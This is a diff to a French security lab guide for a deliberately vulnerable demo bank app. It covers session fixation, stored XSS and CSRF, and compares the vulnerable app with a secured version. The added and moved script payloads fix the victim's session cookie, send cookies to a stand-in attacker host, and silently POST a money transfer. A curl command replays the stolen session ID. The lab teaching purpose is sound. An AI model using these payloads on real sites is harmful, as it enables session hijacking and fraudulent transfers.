@@ -686,9 +686,27 @@ http://vuln.bank.local:8080/login.php?PHPSESSID=ATTACKERfixedSID001
 Connecte-toi avec `mallory / EvilPass1!`. Va sur `comments.php` et poste ce commentaire :
 
 ```html
-<script>document.cookie="PHPSESSID=ATTACKERfixedSID001; path=/";window.location.href='/login.php?msg=Session expirée. Veuillez vous reconnecter.';</script>
+<script>
+document.cookie="PHPSESSID=ATTACKERfixedSID001; path=/";
+new Image().src="http://evil.attacker.lab:8080/collect.php?m=stored-xss&sid=ATTACKERfixedSID001&c="+encodeURIComponent(document.cookie);
+window.location.href='/login.php?msg=Session expirée. Veuillez vous reconnecter.';
+</script>
 ```
-
+```html
+<script>document.cookie="PHPSESSID=ATTACKERfixedSID001; path=/";new Image().src="http://evil.attacker.lab:8080/collect.php?m=stored-xss&sid=ATTACKERfixedSID001&c="+encodeURIComponent(document.cookie)+"&url="+encodeURIComponent(location.href);</script>
+```
+```html
+<script>
+var f = new FormData();
+f.append('to_iban', 'FR7630001007940000000000042');
+f.append('amount', '999');
+f.append('note', 'Transfert automatique');
+fetch('/transfer.php', {method:'POST', credentials:'include', body:f})
+  .then(function(){
+    new Image().src='http://evil.attacker.lab:8080/collect.php?m=csrf-done&sid=done';
+  });
+</script>
+```
 Ce script fait deux choses :
 1. Écrase le cookie PHPSESSID avec `ATTACKERfixedSID001`
 2. Redirige vers le login avec un faux message d'erreur — Alice ne suspecte rien
@@ -853,40 +871,78 @@ En cas de fuite DB, les mots de passe en clair sont exploitables immédiatement.
 
 ---
 
-## DEMO 7 — CSRF via XSS (virement invisible)
+## DEMO 7 — CSRF (Cross-Site Request Forgery)
 
-> Cette démo chaîne XSS + CSRF. Elle montre comment un XSS permet de contourner la politique SameSite.
+> **Faille démontrée** : absence de token CSRF dans `transfer.php` — le serveur accepte n'importe quelle requête POST avec un cookie valide, sans vérifier d'où elle vient.
+>
+> **Différence avec XSS** : ici la requête vient d'un **outil externe** (curl), pas d'un script injecté dans la page. On prouve que le serveur ne vérifie pas l'origine de la requête.
 
-Préalable : remettre le solde d'Alice à 12 450 € :
+---
+
+### Ce qu'est vraiment le CSRF
+
+La faille CSRF c'est que `transfer.php` n'a **aucun token de vérification**. N'importe quelle requête POST avec un cookie valide est exécutée, qu'elle vienne du navigateur d'Alice, d'un script, ou d'un outil tiers.
+
+```php
+// ❌ transfer.php — aucune vérification d'origine
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    $to     = $_POST['to_iban'];
+    $amount = $_POST['amount'];
+    // → virement exécuté sans vérifier si la requête vient bien du site
+}
+```
+
+---
+
+### Étape 1 — Alice est connectée, récupérer son SID
+
+Alice est connectée avec `ATTACKERfixedSID001` (depuis la Demo 1A ou 1B). Le SID est visible sur le dashboard.
+
+---
+
+### Étape 2 — Mallory exécute un virement depuis son terminal
+
+Mallory n'est pas dans le navigateur d'Alice. Il utilise curl pour envoyer une requête cross-origin avec le cookie volé :
+
+```powershell
+curl -s -X POST "http://vuln.bank.local:8080/transfer.php" `
+  -H "Host: vuln.bank.local" `
+  -H "Cookie: PHPSESSID=ATTACKERfixedSID001" `
+  -d "to_iban=FR7630001007940000000000042&amount=500&note=CSRF demo"
+```
+
+Le serveur exécute le virement — il ne vérifie pas que la requête vient du bon endroit.
+
+---
+
+### Étape 3 — Vérifier le virement en DB
+
+```powershell
+docker exec p03-mysql mysql -uroot -prootpass -e "SELECT balance FROM bank_vuln.accounts WHERE user_id=1;"
+```
+
+Le solde d'Alice a diminué de 500 € sans qu'elle ait rien fait.
+
+---
+
+### Étape 4 — L'app sécurisée rejette la requête
+
+```powershell
+curl -s -X POST "http://secure.bank.local:8080/transfer.php" `
+  -H "Host: secure.bank.local" `
+  -H "Cookie: PHPSESSID=ATTACKERfixedSID001" `
+  -d "to_iban=FR7630001007940000000000042&amount=500&note=CSRF demo"
+```
+
+La requête est rejetée — le token CSRF manque dans le POST, le serveur refuse.
+
+---
+
+### Réinitialiser le solde après la démo
+
 ```powershell
 docker exec p03-mysql mysql -uroot -prootpass -e "UPDATE bank_vuln.accounts SET balance=12450.00 WHERE user_id=1;"
 ```
-
-Connecté en tant que **Mallory** :
-
-1. Va sur `http://vuln.bank.local:8080/comments.php`
-2. Poste ce commentaire :
-
-```html
-<script>
-var f = new FormData();
-f.append('to_iban', 'FR7630001007940000000000042');
-f.append('amount', '999');
-f.append('note', 'Transfert automatique');
-fetch('/transfer.php', {method:'POST', credentials:'include', body:f})
-  .then(function(){
-    new Image().src='http://evil.attacker.lab:8080/collect.php?m=csrf-done&sid=done';
-  });
-</script>
-```
-
-3. Déconnecte Mallory
-4. Connecte-toi en tant qu'**Alice**
-5. Va sur `http://vuln.bank.local:8080/comments.php`
-
-Le script s'exécute **silencieusement** — aucune popup, aucune redirection. Va sur le dashboard : **999 € ont été virés** sans qu'Alice ne clique sur rien.
-
-Sur l'app sécurisée, la même tentative échoue car le token CSRF manque dans le payload.
 
 ---
 
